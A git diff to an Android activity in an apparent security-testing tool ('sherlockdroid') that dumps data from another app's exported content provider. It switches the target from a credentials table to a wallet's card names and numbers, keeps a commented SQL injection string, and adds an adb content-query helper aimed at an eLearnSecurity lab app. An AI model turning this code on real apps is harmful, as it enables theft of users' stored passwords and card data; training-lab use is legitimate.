@@ -5,12 +5,17 @@ import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.health.ProcessHealthStats;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.TextView;
 
 import com.example.sherlockdroid.R;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
 
 public class ExportedContent extends Activity {
 
@@ -30,7 +35,7 @@ public class ExportedContent extends Activity {
         //CPReport report = cpm.map();
         //Log.v("CONTENT",report.toString());
         //ArrayList<String[]> rows = cpm.dump("* FROM credentialsTable WHERE 2=2 --.");
-        ContentURI= "content://"+ ContentURI + "/credentials";
+        ContentURI= "content://"+ ContentURI + "/cards";
         //Log.v("SQL INJECTION",rows.toString());
         Log.v("CONTENT URIII",ContentURI.toString());
 
@@ -38,14 +43,15 @@ public class ExportedContent extends Activity {
         loadButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                //1 MODO
+                //********************************************************************************************************************
+                //1 MODO TODO:(FUNZIONA SOLO AGGIUNGENDO android:exported=true nell app vittima)
                 TextView resultView = (TextView) findViewById(R.id.res);
                 try {
                     Cursor cursor = getContentResolver().query(Uri.parse(finalContentURI), null, null, null, null);
                     if (cursor.moveToFirst()) {
                         StringBuilder strBuild = new StringBuilder();
                         while (!cursor.isAfterLast()) {
-                            strBuild.append("\n" + cursor.getString(cursor.getColumnIndex("id")) + "-" + cursor.getString(cursor.getColumnIndex("username")) + "-" + cursor.getString(cursor.getColumnIndex("password")));
+                            strBuild.append("\n" + cursor.getString(cursor.getColumnIndex("_id")) + "-" + cursor.getString(cursor.getColumnIndex("name")) + "-" + cursor.getString(cursor.getColumnIndex("number")));
                             cursor.moveToNext();
                         }
                         resultView.setText(strBuild);
@@ -54,13 +60,42 @@ public class ExportedContent extends Activity {
                     }
 
                 } catch (Exception e) {
-                    resultView.setText("java.lang.SecurityException: Permission Denial --> (exported=true)");
+                    resultView.setText("java.lang.SecurityException: Permission Denial --> (exported=true): " + e);
                 }
+
+                //*************************************************************************************************************************
+                /*
+                //2 MODO USANDO ADB TODO:(NON FUNZIONA)
+                TextView resultView = (TextView) findViewById(R.id.res);
+                try{
+                    exec(finalContentURI,resultView);
+                } catch (Exception e) {
+                    resultView.setText("java.lang.SecurityException: Permission Denial --> (exported=true): " + e);
+                }
+                 */
             }
 
         });//Chiusura button Loading
 
     }//chiusura metodo OnCreate
+
+
+    public static void exec(String ContentURI,TextView resultView) throws IOException {
+        Process process = null;
+        try {
+            String commandToRun = "adb shell content query --uri content://com.elearnsecurity.provider.Wallet/cards";
+            process = Runtime.getRuntime().exec(commandToRun);
+            Log.v("£PROCESSSOOOO",process.toString());
+        } catch (IOException e) {
+        }
+        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            //System.out.print(line+"\n");
+            resultView.setText(line);
+        }
+    }
+
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
 
